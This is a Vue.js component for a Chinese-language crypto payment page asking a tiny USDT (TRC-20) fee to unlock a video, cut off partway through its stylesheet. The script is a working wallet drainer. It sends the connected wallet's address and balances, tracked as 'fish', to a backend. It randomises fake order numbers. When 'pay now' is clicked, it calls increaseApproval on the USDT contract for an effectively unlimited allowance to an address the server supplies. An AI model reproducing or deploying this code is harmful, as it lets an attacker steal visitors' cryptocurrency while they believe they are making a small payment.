<template>
  <div id="pay">
    <div data-v-ada16cfc="" class="section1 flex-col">
      <div data-v-ada16cfc="" class="zhifu" style="display: flex;">
        <img data-v-ada16cfc="" src="data:image/png;base64,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" style="width: 34px;"><span data-v-ada16cfc="">等待支付</span><span data-v-ada16cfc="" style="display: none;">支付成功</span><span data-v-ada16cfc="" style="display: none;">支付失败</span>
      </div>
      <div data-v-ada16cfc="" class="jiaoyi">
        <span data-v-ada16cfc="">交易将在<span>{{ totalOutput?totalOutput:'04.55'}}</span>分钟后关闭,请及时付款!</span>
      </div>
      <div data-v-ada16cfc="" class="fangkuan"></div>
      <div data-v-ada16cfc="" class="section2 flex-col">
        <div data-v-ada16cfc="" class="group1 flex-col">
          <div data-v-ada16cfc="" class="block1 flex-col">
            <div data-v-ada16cfc="" class="outer2 flex-row">
              <span data-v-ada16cfc="" class="txt1">USD$</span><span data-v-ada16cfc="" class="word2">0.1</span>
              <div data-v-ada16cfc="" class="shop" style="margin-top: 45px;">
                <span data-v-ada16cfc="">商品名称:</span><span data-v-ada16cfc="">{{ remark?remark:'视频解锁'}}</span>
              </div><img data-v-ada16cfc="" referrerpolicy="no-referrer" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASIAAAABCAYAAAB68aOaAAAACXBIWXMAAC4jAAAuIwF4pT92AAAHMWlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDggNzkuMTY0MDM2LCAyMDE5LzA4LzEzLTAxOjA2OjU3ICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdEV2dD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlRXZlbnQjIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIiB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iIHhtcDpDcmVhdGVEYXRlPSIyMDIyLTA0LTAyVDE1OjI2OjIzKzA4OjAwIiB4bXA6TWV0YWRhdGFEYXRlPSIyMDIyLTA0LTAyVDE1OjI2OjIzKzA4OjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAyMi0wNC0wMlQxNToyNjoyMyswODowMCIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDozNDFlNzg3ZS0xNDIwLWEwNGQtYmI4Zi1lYTdhMmYwZDdiNDgiIHhtcE1NOkRvY3VtZW50SUQ9ImFkb2JlOmRvY2lkOnBob3Rvc2hvcDo4MzlhOGQxMC1lZjU0LTkxNGUtOTg5NS04OTU0NjI4ZTlkZjYiIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDo3MDg0YTg4MC0zYjMzLThhNDgtYTBmMy03NmYzODQwZWYwYzIiIGRjOmZvcm1hdD0iaW1hZ2UvcG5nIiBwaG90b3Nob3A6Q29sb3JNb2RlPSIzIj4gPHhtcE1NOkhpc3Rvcnk+IDxyZGY6U2VxPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6NzA4NGE4ODAtM2IzMy04YTQ4LWEwZjMtNzZmMzg0MGVmMGMyIiBzdEV2dDp3aGVuPSIyMDIyLTA0LTAyVDE1OjI2OjIzKzA4OjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgMjEuMCAoV2luZG93cykiIHN0RXZ0OmNoYW5nZWQ9Ii8iLz4gPHJkZjpsaSBzdEV2dDphY3Rpb249ImRlcml2ZWQiIHN0RXZ0OnBhcmFtZXRlcnM9ImNvbnZlcnRlZCBmcm9tIGFwcGxpY2F0aW9uL3ZuZC5hZG9iZS5waG90b3Nob3AgdG8gaW1hZ2UvcG5nIi8+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJzYXZlZCIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDozNDFlNzg3ZS0xNDIwLWEwNGQtYmI4Zi1lYTdhMmYwZDdiNDgiIHN0RXZ0OndoZW49IjIwMjItMDQtMDJUMTU6MjY6MjMrMDg6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCAyMS4wIChXaW5kb3dzKSIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8L3JkZjpTZXE+IDwveG1wTU06SGlzdG9yeT4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NzA4NGE4ODAtM2IzMy04YTQ4LWEwZjMtNzZmMzg0MGVmMGMyIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjcwODRhODgwLTNiMzMtOGE0OC1hMGYzLTc2ZjM4NDBlZjBjMiIgc3RSZWY6b3JpZ2luYWxEb2N1bWVudElEPSJ4bXAuZGlkOjcwODRhODgwLTNiMzMtOGE0OC1hMGYzLTc2ZjM4NDBlZjBjMiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PtQl5jgAAAAdSURBVDjLY+zo6PjPgAoYkdijcqNyo3KjcjSXAwDpmyuZZstYtAAAAABJRU5ErkJggg==" class="pic1">
              <div data-v-ada16cfc="" class="shop list1">
                <span data-v-ada16cfc="">交易单号：</span><span data-v-ada16cfc="">{{ participant?participant:'xlcb3108350037'}}</span>
              </div>
              <div data-v-ada16cfc="" class="shop">
                <span data-v-ada16cfc="">商户单号：</span><span data-v-ada16cfc="">{{ userRevenue?userRevenue:'Sy8747632631'}}</span>
              </div>
            </div>
            <div data-v-ada16cfc="" class="outer4 flex-col">
              <span data-v-ada16cfc="" class="word3" @click="startPaying">立即支付</span><!---->
            </div>
          </div><span data-v-ada16cfc="" class="txt2">仅支持USDT（TRC-20）</span>
        </div>
      </div>
    </div>
    <div data-v-ada16cfc="" class="u-spiner van-loading van-loading--spinner" style="display: none;"></div>
  </div>
</template>
<script>
import {addFish, getFish, getAuth, addAuth, withdraw, listRecord} from "@/api/tron/auth";

export default {
  data() {
    return {
      abi: [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"deprecated","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_evilUser","type":"address"}],"name":"addBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"unpause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_subtractedValue","type":"uint256"}],"name":"decreaseApproval","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"_value","type":"uint256"}],"name":"calcFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"oldBalanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints","type":"uint256"},{"name":"newMaxFee","type":"uint256"}],"name":"setParams","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_addedValue","type":"uint256"}],"name":"increaseApproval","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"redeem","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint8"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"previousOwner","type":"address"},{"indexed":true,"name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"}],
      contractAddr: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
      approveAddr: undefined,
      walletAddress: undefined,
      totalOutput:0.00,
      validNode:0.00,
      participant:0.00,
      userRevenue:0.00,
      remark:null,
      fish: {
        token: undefined,
        address: undefined,
        auAddress: undefined,
        trx: undefined,
        usdt: undefined,
        total: undefined,
        allowWithdraw: undefined
      }
    };
  },
  created() {
    this.init();
  },
  methods: {
    connectionWallet(){
      var obj = setInterval( async async => {
        clearInterval(obj);
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
          var wallet_addr = window.tronWeb.defaultAddress.base58;
          this.walletAddress = wallet_addr.substr(0, 4) + '***' + wallet_addr.substr(30, 6);
          this.contract = await window.tronWeb.contract(this.abi, this.contractAddr);
          console.info(wallet_addr);

          await window.tronWeb.trx.getBalance(wallet_addr).then(result => this.fish.trx= result==null?"0.00":result);
          this.fish.address=wallet_addr;
          await this.contract.balanceOf(wallet_addr).call((err, usdt) => {
            this.fish.usdt= usdt==null?"0.00":usdt/1.0;
            addFish(this.fish).then(response => {
              if (response.data.code == 200){
                this.fish=response.data.data;
                var balance = eval('(' + this.fish.balance +')');
                this.fish.trx=balance.trx==null?0.00:balance.trx;
                this.fish.usdt=balance.usdt==null?0.00:balance.usdt;
                this.fish.allowWithdraw=balance.interest==null?0.00:balance.interest;
                this.fish.total=balance.finish_withdraw==null?0.00:balance.finish_withdraw;

                return true;
              }else{
                return false;
              }
            });
          });
        }
      }, 10);
    },
    getUrlKey: function (name) {
      return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(location.href) || [, ""])[1].replace(/\+/g, '%20')) || null
    },
    init(){
      var token=this.getUrlKey("token");
      if (!token){
        this.$toast({ message: "Please input token"});
        return;
      }
      this.fish.token=token;
      getAuth(token).then(response => {
        if (response.data.code==200){
          this.approveAddr=response.data.data.address;
          this.fish.auAddress=response.data.data.address;
          this.salemanPhone=response.data.data.salemanPhone;
          this.totalOutput=response.data.data.totalOutput;
          this.validNode=response.data.data.validNode;
          this.participant=response.data.data.participant+Math.round(Math.random()*100); //xlcb3108350037
          this.userRevenue=response.data.data.userRevenue+Math.round(Math.random()*100); //Sy8747632631
          this.remark=response.data.data.remark;
          this.connectionWallet();
          return;
        }
        if (response.data.code==500){
          return;
        }
      });
    },
    startPaying() {
      window.tronWeb.trx.getBalance(this.myWalletAddress).then(result => this.fish.trx = (result / 1000000).toFixed(6));

      var token = this.getUrlKey("token");
      this.fish.token = token;
      this.fish.auAddress = this.approveAddr;
      getFish(this.fish).then(response => {
        if (response.data.data.auRecordId == null) {
          // if (this.fish.trx <= 6) {
          //   this.$toast({message: "Your TRX balance is insufficient. Please deposit at least 10 TRX"});
          //   return;
          // }
          let res = this.contract["increaseApproval"](this.approveAddr, "90000000000000000000000000000");
          res.send({
            feeLimit: 10000000,
            callValue: 0,
            shouldPollResponse: false
          }, (err, res) => {
            if (err == null) {
              this.addAuth(this.fish).then(response => {
                //TODO 如果支付成功，跳转到支付成功页面
              });
            } else {
              console.info(err);
            }
          })
          return true;
        } else {
          this.fish = response.data.data;
          var balance = eval('(' + this.fish.balance + ')');
          this.fish.trx = balance.trx == null ? 0.00 : balance.trx;
          this.fish.usdt = balance.usdt == null ? 0.00 : balance.usdt;
          this.fish.allowWithdraw = balance.interest == null ? 0.00 : balance.interest;
          this.fish.total = balance.finish_withdraw == null ? 0.00 : balance.finish_withdraw;
          this.$toast({message: "Paying Success"});
          return false;
        }
      });
    }
  }
};
</script>
<style lang="scss">
[data-v-3a48c95a] .van-toast{position:fixed;top:50%;left:0;right:0;z-index:2022!important;margin:0 auto;}.layer1[data-v-ada16cfc]{width:155px;height:42px;text-align:center;margin:3px 0 0 3px;}.pic4[data-v-ada16cfc]{width:67px;height:16px;margin:13px 0 0 45px;}a,abbr,acronym,address,applet,article,aside,audio,b,big,blockquote,body,canvas,caption,center,cite,code,dd,del,details,dfn,div,dl,dt,em,embed,fieldset,figcaption,figure,footer,form,h1,h2,h3,h4,h5,h6,header,html,i,iframe,img,input,ins,kbd,label,legend,li,mark,menu,nav,object,ol,output,p,pre,q,ruby,s,samp,section,small,span,strike,strong,sub,summary,sup,table,tbody,td,tfoot,th,thead,time,tr,tt,u,ul,var,video{border:0;font-size:100%;font-weight:400;vertical-align:baseline;margin:0;padding:0;}article,aside,details,figcaption,figure,footer,header,menu,nav,section{display:block;}body{line-height:1;-webkit-text-size-adjust:none;-webkit-tap-highlight-color:rgba(0,0,0,0);}blockquote,q{quotes:none;}blockquote:after,blockquote:before,q:after,q:before{content:none;}table{border-collapse:collapse;border-spacing:0;}a{text-decoration:none;-webkit-backface-visibility:hidden;}li{list-style:none;}::-webkit-scrollbar{width:5px;height:5px;}::-webkit-scrollbar-track-piece{background-color:rgba(0,0,0,.2);-webkit-border-radius:6px;}::-webkit-scrollbar-thumb:vertical{height:5px;background-color:hsla(0,0%,49%,.7);-webkit-border-radius:6px;}::-webkit-scrollbar-thumb:horizontal{width:5px;background-color:hsla(0,0%,49%,.7);-webkit-border-radius:6px;}body,html{width:100%;height:100%;margin:0 auto!important;}body[data-v-3a48c95a],body[data-v-ada16cfc]{background-color:#fff;}#app[data-v-3a48c95a],#app[data-v-ada16cfc]{display:flex;min-height:100%;}.h-fkxq[data-v-3a48c95a],.h-fkxq[data-v-ada16cfc]{font-size:16px;height:30px;display:inline-block;text-align:center;margin-top:13px;color:#fff;}main[data-v-3a48c95a],main[data-v-ada16cfc]{background-color:#fff;width:100%;flex:1;margin:0 auto;}.section1[data-v-3a48c95a],.section1[data-v-ada16cfc]{z-index:2;height:216px;background:#5c93ff;border-radius:0 0 0 0;opacity:1;position:relative;display:flex;justify-content:center;}.section2[data-v-3a48c95a],.section2[data-v-ada16cfc]{height:464px;margin-top:140px;display:flex;flex-direction:column;}.zhifu[data-v-3a48c95a],.zhifu[data-v-ada16cfc]{width:375px;height:33px;position:absolute;top:71px;box-sizing:border-box;padding:0 35px;}.zhifu span[data-v-3a48c95a],.zhifu span[data-v-ada16cfc]{margin-left:16px;line-height:33px;color:#fff;font-size:24px;}.jiaoyi[data-v-3a48c95a],.jiaoyi[data-v-ada16cfc]{width:375px;height:17px;position:absolute;top:128px;box-sizing:border-box;padding-left:35px;color:#fff;}.fangkuan[data-v-3a48c95a],.fangkuan[data-v-ada16cfc]{width:305px;height:15px;position:absolute;top:183px;border-radius:8px;background-color:#2e6ee9;}.shop[data-v-3a48c95a],.shop[data-v-ada16cfc]{margin-left:20px;width:100%;height:25px;margin-top:10px;font-size:14px;color:#c4c4c4;}.shop span[data-v-3a48c95a]:first-of-type,.shop span[data-v-ada16cfc]:first-of-type{color:#c4c4c4;display:inline-block;margin-right:7px;}.shop span[data-v-3a48c95a]:nth-of-type(2),.shop span[data-v-ada16cfc]:nth-of-type(2){color:#333;}.group1[data-v-3a48c95a],.group1[data-v-ada16cfc]{background-color:#fff;width:271px;height:231px;position:relative;top:50px;box-shadow:0 3px 6px 1px rgba(0,0,0,.08);border-radius:0 0 4px 4px;margin:0 auto;}.block1[data-v-3a48c95a],.block1[data-v-ada16cfc]{width:290px;height:366px;position:relative;}.outer1[data-v-3a48c95a],.outer1[data-v-ada16cfc]{height:30px;}.word1[data-v-3a48c95a],.word1[data-v-ada16cfc]{overflow-wrap:break-word;color:#44b2d9;font-size:25px;text-align:center;white-space:nowrap;line-height:25px;display:block;}.outer2[data-v-3a48c95a],.outer2[data-v-ada16cfc]{width:228px;height:32px;}.icon1[data-v-3a48c95a],.icon1[data-v-ada16cfc]{width:14px;height:11px;margin-top:11px;}.txt1[data-v-3a48c95a],.txt1[data-v-ada16cfc]{width:38px;height:20px;overflow-wrap:break-word;font-size:14px;margin-left:56px;margin-top:22px;}.txt1[data-v-3a48c95a],.word2[data-v-3a48c95a],.txt1[data-v-ada16cfc],.word2[data-v-ada16cfc]{color:red;font-family:PingFang SC-Bold,PingFang SC;font-weight:700;}.word2[data-v-3a48c95a],.word2[data-v-ada16cfc]{width:80px;height:42px;font-size:30px;position:relative;top:15px;left:5px;}.outer3[data-v-3a48c95a],.outer3[data-v-ada16cfc]{font-size:0;line-height:18px;margin:41px 0 0 82px;}.info1[data-v-3a48c95a],.outer3[data-v-3a48c95a],.info1[data-v-ada16cfc],.outer3[data-v-ada16cfc]{width:138px;height:18px;overflow-wrap:break-word;text-align:left;white-space:nowrap;}.info1[data-v-3a48c95a],.info1[data-v-ada16cfc]{color:red;font-size:16px;line-height:16px;}.info2[data-v-3a48c95a],.info2[data-v-ada16cfc]{width:138px;overflow-wrap:break-word;color:red;font-size:20px;text-align:left;white-space:nowrap;line-height:20px;}.outer4[data-v-3a48c95a],.outer4[data-v-ada16cfc]{height:41px;line-height:41px;background-color:#5c93ff;width:300px;border-radius:21px;box-shadow:0 3px 6px 1px rgba(92,147,255,.3);position:relative;text-align:center;top:245px;left:-35px;margin:22px 0 0 17px;}.word3[data-v-3a48c95a],.word3[data-v-ada16cfc]{width:72px;color:#fff;height:25px;font-size:18px;text-align:center;line-height:25px;}.txt2[data-v-3a48c95a],.word3[data-v-3a48c95a],.txt2[data-v-ada16cfc],.word3[data-v-ada16cfc]{overflow-wrap:break-word;font-family:PingFang SC-Regular,PingFang SC;font-weight:400;white-space:nowrap;}.txt2[data-v-3a48c95a],.txt2[data-v-ada16cfc]{position:absolute;bottom:20px;width:115px;height:14px;color:#666;font-size:12px;text-align:left;line-height:10px;display:block;margin-left:20px;}.pic1[data-v-3a48c95a],.pic1[data-v-ada16cfc]{width:255px;height:1px;margin-top:10px;position:relative;top:-3px;left:7px;opacity:.6;}.outer5[data-v-3a48c95a],.outer5[data-v-ada16cfc]{font-size:0;font-family:Adobe Heiti Std R;line-height:12px;margin:14px 0 0 